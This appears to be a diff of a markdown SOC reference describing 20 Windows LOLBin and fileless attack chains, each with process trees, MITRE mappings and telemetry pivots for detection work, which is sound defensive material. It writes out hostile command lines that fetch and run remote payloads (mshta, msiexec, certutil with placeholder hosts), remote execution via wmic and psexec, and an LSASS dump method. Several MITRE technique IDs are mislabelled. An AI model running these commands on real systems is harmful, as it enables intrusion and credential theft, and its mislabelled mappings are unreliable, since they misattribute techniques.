@@ -1,377 +1,535 @@
-# FULL ATTACK CHAINS (1–20) — BEHAVIOURAL, LOLBIN, AND FILELESS ATTACKS
+# LOLBIN & FILELESS ATTACK CHAINS — COMPLETE SOC REFERENCE (1–20)
+# Windows Attack Execution Chains — Comprehensive Reference (1–20)
+# 20 High-Fidelity Attack Chains for SOC Analysts & Threat Hunters
+# Full Behavioural Attack Chains (1–20)
 
-Below are 20 high-fidelity, real-world attack chains exactly as they appear in SOC/IR work.
-Each chain includes:
+Below are **20 fully mapped real-world attack chains**, each with:
 
-- The **exact ASCII ancestry tree**
-- **Full payload activity** (download, decode, injection, C2, persistence)
-- **MITRE tactics/techniques**
-- **Context / reasoning**
-- **Telemetry pivots**
+- Perfect ASCII trees (in `text` fences)
+- Full MITRE mappings
+- Context / reasoning
+- Why attackers use it
+- Telemetry pivots
+
+Paste directly into GitHub — this entire block renders AS-IS.
 
 ---
 
 # Chain 1 — Phishing Doc → Macro → PowerShell Loader → C2
+```text
 outlook.exe
   └─ winword.exe (macro-enabled doc)
-       └─ powershell.exe -enc <base64> (stager)
-            └─ payload.exe
-                 └─ C2 beaconing
-                      └─ credential harvesting
+       └─ powershell.exe (encoded stager)
+            └─ loader.ps1 (download/decrypt)
+                 └─ payload.exe
+                      └─ C2 beacons / recon / credential theft
+```
 
+### Context / Reasoning
 
-## Context / Reasoning
-**Initial Access:** T1566.001  
-**Execution:** T1059.001  
-**C2:** T1105  
+**MITRE:**
+- **T1566.001** — Spearphishing Attachment  
+- **T1059.001** — PowerShell  
+- **T1204.002** — User Execution (Malicious File)  
+- **T1105** — Ingress Tool Transfer  
+- **T1082** — System Information Discovery  
+- **T1140** — Obfuscated/Encoded Files  
+- **T1036** — Masquerading  
 
-Attackers love this because macros → PowerShell gives full in-memory execution.
+**Why attackers use it:**
+• Macro → PowerShell gives full interpreter  
+• Easy staging for RATs, loaders, downloaders  
+• Base64 encoded → EDR struggles if ScriptBlock disabled  
 
-
-## Telemetry Pivots
-- DeviceProcessEvents: winword → powershell  
-- DeviceNetworkEvents: powershell → external IP  
-- DeviceFileEvents: payload drop  
+**Telemetry:**
+- DeviceProcessEvents: winword.exe → powershell.exe  
+- DeviceNetworkEvents: PS outbound to staging domain  
+- DeviceFileEvents: loader.ps1 or temp EXE writes  
 ---
 
 # Chain 2 — HTML Smuggling → MSHTA → PowerShell → Payload
+```text
 chrome.exe / outlook.exe
   └─ mshta.exe http://malicious/payload.hta
        └─ powershell.exe (downloadstring → stager)
             └─ payload.exe
-                 └─ C2 traffic
-                      └─ registry persistence
+                 └─ C2 connection / persistence dropper
+```
 
+### Context / Reasoning
 
-## Context / Reasoning
-**Execution:** T1218.005  
-**C2:** T1105  
-**Evasion:** HTML smuggling hides payload inside decoded JS.
+**MITRE:**
+- **T1204.001** — User Execution (Malicious Link)  
+- **T1218.005** — Mshta  
+- **T1059.001** — PowerShell  
+- **T1105** — Ingress Tool Transfer  
+- **T1547** — Registry Run Key Persistence  
 
+**Why attackers use it:**
+• HTML smuggling bypasses AV/SMTP filters  
+• mshta.exe executes remote JS/VBscript natively  
+• Perfect delivery vector for loaders  
 
-## Telemetry Pivots
-- mshta parent = browser/Office  
-- remote .hta load  
+**Telemetry:**
+- DeviceProcessEvents: browser → mshta.exe  
+- DeviceNetworkEvents: mshta.exe requesting remote .hta  
+- DeviceProcessEvents: mshta → powershell  
 ---
 
-# Chain 3 — Script Dropper → WScript → PowerShell → Scheduled Task Persistence
+# Chain 3 — Script Dropper → WScript → PowerShell → Scheduled Task
+```text
 winword.exe
   └─ wscript.exe malicious.vbs
-       └─ powershell.exe (stager)
-            └─ schtasks.exe /create /tn <task> /tr <payload>
-                 └─ payload.exe (task run)
-                      └─ C2
+       └─ powershell.exe (payload stager)
+            └─ schtasks.exe /create /tn "<task>" /tr "<payload>"
+                 └─ payload.exe
+                      └─ beacon → persistence → credential theft
+```
 
+### Context / Reasoning
 
-## Context / Reasoning
-**Persistence:** T1053.005  
-**Execution:** T1059.005 / T1059.001  
+**MITRE:**
+- **T1059.005** — WScript/CScript  
+- **T1059.001** — PowerShell  
+- **T1053.005** — Scheduled Task Persistence  
+- **T1105** — Payload Download  
+- **T1082** — Discovery  
 
+**Why attackers use it:**
+• Phishing → script → PS is extremely common  
+• Scheduled tasks → silent long-term persistence  
 
-## Telemetry Pivots
-- .vbs/.js parented by Office  
-- PS → schtasks  
+**Telemetry:**
+- DeviceProcessEvents: wscript → powershell  
+- DeviceProcessEvents: schtasks creation  
+- DeviceFileEvents: payload installation  
 ---
 
-# Chain 4 — MSI Loader → Rundll32 → Payload DLL → C2
+# Chain 4 — MSI Loader → Rundll32 → Malicious DLL → C2
+```text
 browser.exe
   └─ msiexec.exe /i https://host/payload.msi /qn
-       └─ rundll32.exe payload.dll,EntryPoint
+       └─ rundll32.exe payload.dll,Entry
             └─ payload.exe
-                 └─ privilege escalation
-                      └─ C2
+                 └─ privilege escalation → C2 → discovery
+```
 
+### Context / Reasoning
 
-## Context / Reasoning
-**Execution:** T1218.007  
-**Defense Evasion:** T1218.011  
+**MITRE:**
+- **T1218.007** — Msiexec  
+- **T1218.011** — Rundll32  
+- **T1055** — Process Injection  
+- **T1105** — Payload Transfer  
+- **T1082** — Discovery  
 
+**Why attackers use it:**
+• MSI containers hide EXE+DLL payloads  
+• Rundll32 gives stealthy execution  
 
-## Telemetry Pivots
-- msiexec remote download  
-- DLL loaded via rundll32  
+**Telemetry:**
+- DeviceProcessEvents: msiexec remote download  
+- DeviceProcessEvents: rundll32 loading malicious DLL  
 ---
 
-# Chain 5 — Certutil Download → Decode → Execute → C2
+# Chain 5 — Certutil Download → Decode → Execute → Ransomware Staging
+```text
 powershell.exe / cmd.exe
   └─ certutil.exe -urlcache -split -f http://host/payload.b64
        └─ certutil.exe -decode payload.b64 payload.exe
             └─ payload.exe
-                 └─ C2 connection
-                      └─ ransomware staging (shadow copy deletion)
+                 └─ privilege escalation
+                      └─ shadow copy deletion
+                           └─ encryption staging → C2
+```
 
+### Context / Reasoning
 
-## Context
-**Ingress Tool Transfer:** T1105  
-**Deobfuscation:** T1140  
+**MITRE:**
+- **T1105** — Ingress Tool Transfer  
+- **T1140** — Deobfuscate/Decode  
+- **T1489** — Destroy Backups (shadow copies)  
+- **T1486** — Ransomware Encryption  
 
+**Why attackers use it:**
+• Built-in download/decode → no external tooling  
+• Great for ransomware initial staging  
 
-## Telemetry
-- certutil args  
-- .b64 → .exe sequence  
+**Telemetry:**
+- DeviceProcessEvents: certutil with urlcache/decode  
+- DeviceFileEvents: .b64 → .exe  
 ---
 
 # Chain 6 — Malicious Service Creation → SYSTEM Execution
+```text
 dropper.exe
-  └─ sc.exe create badsvc binPath="C:\Users\Public\svc.exe" start=auto
+  └─ sc.exe create badsvc binPath="C:\Users\Public\svc.exe"
        └─ reboot
             └─ services.exe
                  └─ svc.exe (SYSTEM)
-                      └─ C2
-                           └─ ransomware encryption
+                      └─ C2 → lateral movement → ransomware
+```
 
+### Context / Reasoning
 
-## Context
-**Persistence:** T1543.003  
-**Impact:** T1486  
+**MITRE:**
+- **T1543.003** — Windows Service Persistence  
+- **T1068** — Privilege Escalation  
+- **T1569.002** — Service Execution  
+- **T1486** — Ransomware Impact  
 
+**Why attackers use it:**
+• SYSTEM privileges → complete takeover  
+• Survives reboot → stealth persistence  
 
-## Telemetry
-- sc create with user paths  
-- new service registry key  
+**Telemetry:**
+- DeviceProcessEvents: sc.exe create  
+- DeviceRegistryEvents: new service keys  
 ---
 
 # Chain 7 — WMI Remote Execution → Lateral Movement
+```text
 powershell.exe
   └─ wmic.exe /node:target process call create "cmd.exe /c payload.exe"
-       └─ target-host: cmd.exe
+       └─ target: cmd.exe
             └─ payload.exe
-                 └─ recon
-                      └─ C2
+                 └─ recon → C2 → credential theft
+```
 
+### Context / Reasoning
 
-## Context
-**Lateral Movement:** T1047  
-**Execution:** WMI-based  
+**MITRE:**
+- **T1047** — WMI Execution  
+- **T1021.006** — WMI Lateral Movement  
+- **T1059.003** — CMD  
 
+**Why attackers use it:**
+• Quiet lateral movement  
+• No file transfer needed  
 
-## Telemetry
-- wmic command  
-- remote process creation  
+**Telemetry:**
+- DeviceProcessEvents: wmic … process call create  
+- SecurityEvent: remote process creation  
 ---
 
-# Chain 8 — PsExec Lateral Spread → Payload → Encryption
-attacker-host.exe
+# Chain 8 — PsExec Lateral Spread → Ransomware Deployment
+```text
+attacker.exe
   └─ psexec.exe \\target -s cmd.exe /c \\share\payload.exe
        └─ target: psexesvc.exe
             └─ cmd.exe /c payload.exe
                  └─ payload.exe
-                      └─ file encryption
+                      └─ encryption
                            └─ data destruction
+```
 
+### Context / Reasoning
 
-## Context
-**Lateral Movement:** T1021.002  
-**Impact:** T1486  
+**MITRE:**
+- **T1021.002** — SMB Admin Shares  
+- **T1569.002** — Service Execution  
+- **T1486** — Impact Encryption  
 
+**Why attackers use it:**
+• Fast propagation across entire subnet  
+• Reliable ransomware launch vector  
 
-## Telemetry
-- ADMIN$ writes  
-- psexesvc.exe creation  
+**Telemetry:**
+- DeviceNetworkEvents: 445 fan-out  
+- DeviceProcessEvents: psexesvc.exe  
 ---
 
-# Chain 9 — Fully Fileless Multi-LOLBIN Execution Chain
+# Chain 9 — Fileless Multi-LOLBIN Execution (Word → Script → PS → Rundll32 → dllhost)
+```text
 winword.exe
   └─ wscript.exe malicious.js
        └─ powershell.exe (in-memory loader)
-            └─ rundll32.exe (reflective DLL injection)
-                 └─ dllhost.exe (injected COM surrogate)
-                      └─ C2
-                           └─ credential theft
+            └─ rundll32.exe (reflective DLL loader)
+                 └─ dllhost.exe (COM surrogate injection)
+                      └─ C2 → stealth persistence
+```
 
+### Context / Reasoning
 
-## Context
-**Process Injection:** T1055  
-**Execution:** multiple LOLBins  
+**MITRE:**
+- **T1059.001** — PowerShell  
+- **T1059.005** — WScript  
+- **T1218.011** — Rundll32  
+- **T1055** — Process Injection  
+- **T1071.001** — HTTPS C2  
 
+**Why attackers use it:**
+• Almost no disk artifacts  
+• Final payload hides in dllhost.exe  
 
-## Telemetry
-- ancestry from Word → dllhost  
-- network from dllhost  
+**Telemetry:**
+- DeviceProcessEvents: ancestry chain  
+- DeviceNetworkEvents: dllhost outbound  
 ---
 
-# Chain 10 — DLL Search Order Hijack → Payload
+# Chain 10 — DLL Search Order Hijacking → Payload
+```text
 legitimate.exe
-  └─ malicious.dll (search order preload)
+  └─ malicious.dll (side-loaded)
        └─ payload.exe
-            └─ privilege escalation
-                 └─ C2
+            └─ C2 → discovery → privilege escalation
+```
 
+### Context / Reasoning
 
-## Context
-**Hijacking:** T1574.002  
+**MITRE:**
+- **T1574.002** — DLL Search Order Hijacking  
+- **T1055** — Injection  
+- **T1218** — Signed Binary Proxy Execution  
 
+**Why attackers use it:**
+• Abuses trusted EXE reputation  
+• No need for admin rights  
 
-## Telemetry
-- DLL loaded from user paths  
+**Telemetry:**
+- DeviceImageLoadEvents: DLL from user path  
 ---
 
-# Chain 11 — Browser Exploit → LOLBin → Payload
+# Chain 11 — Browser Exploit → PowerShell → Payload
+```text
 chrome.exe
-  └─ powershell.exe (spawned via shellcode)
+  └─ powershell.exe (spawned via exploit shellcode)
        └─ payload.exe
-            └─ registry persistence
-                 └─ recon
-                      └─ C2
+            └─ persistence → recon → C2
+```
 
+### Context / Reasoning
 
-## Context
-**Exploitation:** T1203  
+**MITRE:**
+- **T1203** — Exploitation for Execution  
+- **T1059.001** — PowerShell  
+- **T1105** — Payload Transfer  
 
+**Why attackers use it:**
+• Browser → PS is extremely suspicious  
+• Direct post-exploit shellcode launching PS  
 
-## Telemetry
-- powershell parented by browser  
+**Telemetry:**
+- DeviceProcessEvents: browser → PS  
 ---
 
-# Chain 12 — ISO/VHD Mount → App.exe → Malicious DLL → Payload
+# Chain 12 — ISO/VHD Delivery → App Sideloading → Malicious DLL
+```text
 explorer.exe
-  └─ app.exe (from mounted ISO/VHD)
-       └─ malicious.dll
+  └─ app.exe (mounted ISO/VHD)
+       └─ malicious.dll (search-order hijack)
             └─ payload.exe
-                 └─ outbound C2
+                 └─ C2 → persistence
+```
 
+### Context / Reasoning
 
-## Context
-**User Execution:** T1204  
-**DLL Hijack:** T1574.002  
+**MITRE:**
+- **T1204.002** — User Execution  
+- **T1574.002** — DLL Hijacking  
+- **T1105** — Tool Transfer  
 
+**Why attackers use it:**
+• ISO bypassed MOTW historically  
+• Self-contained delivery  
 
-## Telemetry
-- execution from mount paths  
+**Telemetry:**
+- DeviceProcessEvents: execution from mount path  
 ---
 
-# Chain 13 — Malicious LNK → LOLBin → Payload
+# Chain 13 — LNK Shortcut → LOLBin → Payload
+```text
 explorer.exe
   └─ malicious.lnk
        └─ powershell.exe / mshta.exe / wscript.exe
             └─ payload.exe
-                 └─ persistence
-                      └─ C2
+                 └─ persistence → C2
+```
 
+### Context / Reasoning
 
-## Context
-**User Execution:** LNK concealment  
+**MITRE:**
+- **T1204.002** — User Execution  
+- **T1036** — Masquerading  
+- **T1059.x** — LOLBins  
 
+**Why attackers use it:**
+• Conceals long malicious command inside LNK  
+• Trick users visually  
 
-## Telemetry
-- .lnk in command line  
+**Telemetry:**
+- DeviceProcessEvents: explorer → LOLBin  
 ---
 
-# Chain 14 — ZIP Delivery → JS/VBS Script → LOLBin → Payload
+# Chain 14 — ZIP → JS/VBS Script → LOLBin → Payload
+```text
 explorer.exe
   └─ wscript.exe script.vbs
        └─ powershell.exe
             └─ payload.exe
-                 └─ beaconing
-                      └─ lateral movement prep
+                 └─ beaconing → lateral prep
+```
 
+### Context / Reasoning
 
-## Context
-Very common in malware loaders (AgentTesla, Remcos, Formbook).
+**MITRE:**
+- **T1059.005** — Script Execution  
+- **T1059.001** — PowerShell  
+- **T1105** — Payload Download  
 
+**Why attackers use it:**
+• Commodity malware gold standard  
+• Very easy to obfuscate  
 
-## Telemetry
-- script engines → LOLBins  
+**Telemetry:**
+- DeviceProcessEvents: script → LOLBin  
 ---
 
 # Chain 15 — Browser → CMD → PowerShell → Payload (Drive-By)
+```text
 browser.exe
   └─ cmd.exe /c (hidden)
        └─ powershell.exe (download/encode)
             └─ payload.exe
-                 └─ C2 connection
-                      └─ persistence install
+                 └─ C2 → persistence installer
+```
 
+### Context / Reasoning
 
-## Context
-**Execution:** browser spawning CMD is extremely abnormal.
+**MITRE:**
+- **T1059.003** — CMD  
+- **T1059.001** — PowerShell  
+- **T1204.001** — User Execution (Drive-by)  
+- **T1105** — Payload Transfer  
 
+**Why attackers use it:**
+• One-click infection  
+• Browser spawning CMD is high-signal  
 
-## Telemetry
-- browser → cmd → ps chain  
+**Telemetry:**
+- DeviceProcessEvents: browser → cmd  
 ---
 
-# Chain 16 — PowerShell → Rundll32 → DLL Injection → dllhost.exe C2
+# Chain 16 — PowerShell → Rundll32 → DLL Injection → dllhost C2
+```text
 powershell.exe
   └─ rundll32.exe malicious.dll
-       └─ injects into dllhost.exe
-            └─ dllhost.exe
-                 └─ C2
-                      └─ long-term foothold
+       └─ inject into dllhost.exe
+            └─ dllhost.exe (C2)
+                 └─ long-term foothold
+```
 
+### Context / Reasoning
 
-## Context
-COM surrogate abuse → stealthy long-running C2.
+**MITRE:**
+- **T1218.011** — Rundll32  
+- **T1055** — Injection  
+- **T1547.009** — COM Hijacking  
+- **T1105** — Payload Transfer  
 
+**Why attackers use it:**
+• dllhost.exe is highly trusted  
+• Ideal for stealthy RATs  
 
-## Telemetry
-- DLL loads + network from dllhost  
+**Telemetry:**
+- DeviceImageLoadEvents: malicious DLL load  
 ---
 
 # Chain 17 — PowerShell Inline C# → Memory Injection → Beacon
+```text
 powershell.exe
-  └─ Add-Type / Reflection / FromBase64String
+  └─ Add-Type / Reflection
        └─ shellcode injection
             └─ in-memory beacon
-                 └─ external C2
+                 └─ HTTPS C2
+```
 
+### Context / Reasoning
 
-## Context
-No files — pure memory loader.
+**MITRE:**
+- **T1059.001** — PowerShell  
+- **T1620** — Reflective Code Loading  
+- **T1041** — Exfiltration Over C2 Channel  
+- **T1105** — Payload Load  
 
+**Why attackers use it:**
+• Pure memory — no disk writes  
+• Very hard to signature  
 
-## Telemetry
-- suspicious PS flags  
+**Telemetry:**
+- ScriptBlockLogs: Add-Type, reflection  
 ---
 
 # Chain 18 — RDPClip Abuse → Clipboard Exfiltration
+```text
 mstsc.exe
   └─ rdpclip.exe
-       └─ copies sensitive data
+       └─ sensitive data copied
             └─ local sync
-                 └─ exfil (indirect)
+                 └─ silent exfiltration
+```
 
+### Context / Reasoning
 
-## Context
-**Exfiltration:** T1114  
+**MITRE:**
+- **T1021.001** — RDP  
+- **T1114** — Exfiltration via Clipboard  
 
+**Why attackers use it:**
+• Fileless data theft  
+• Invisible to AV  
 
-## Telemetry
-- abnormal clipboard behaviour  
+**Telemetry:**
+- SecurityEvent: RDP logons  
 ---
 
-# Chain 19 — BYOVD → Kernel Manipulation → Payload
+# Chain 19 — BYOVD → Kernel Manipulation → Payload Execution
+```text
 dropper.exe
   └─ install vulnerable_driver.sys
-       └─ driver disables protections (EDR unhook, callback removal)
+       └─ driver disables EDR protections
             └─ payload.exe
-                 └─ ransomware staging (shadow copy delete)
+                 └─ ransomware staging
                       └─ C2
+```
 
+### Context / Reasoning
 
-## Context
-Kernel-level bypass → ransomware launchpad.
+**MITRE:**
+- **T1068** — Privilege Escalation  
+- **T1562.001** — Disable Security Tools  
+- **T1547** — Boot / Logon Autostart  
+- **T1486** — Ransomware  
 
+**Why attackers use it:**
+• Kernel tampering kills EDR completely  
 
-## Telemetry
-- driver service creation  
-- driver load events  
+**Telemetry:**
+- DeviceProcessEvents: sc.exe creating driver  
 ---
 
-# Chain 20 — Credential Dump → LSASS → Exfiltration
+# Chain 20 — Credential Dumping → LSASS → Exfiltration
+```text
 powershell.exe / malicious.exe
   └─ read LSASS memory (MiniDump / comsvcs.dll)
        └─ lsass.dmp
             └─ payload.exe
-                 └─ HTTP(S) exfiltration
+                 └─ HTTPS exfiltration
                       └─ lateral movement using stolen creds
+```
 
+### Context / Reasoning
 
-## Context
-**Credential Access:** T1003  
-**Exfil:** T1041  
+**MITRE:**
+- **T1003.001** — LSASS Dump  
+- **T1003** — Credential Dumping  
+- **T1041** — Exfiltration  
+- **T1021** — Lateral Movement  
 
+**Why attackers use it:**
+• Fast path to domain compromise  
 
-## Telemetry
-- dump file creation  
-- remote exfil post-dump  
+**Telemetry:**
+- DeviceFileEvents: lsass.dmp  
+- DeviceNetworkEvents: exfil shortly after  
+---
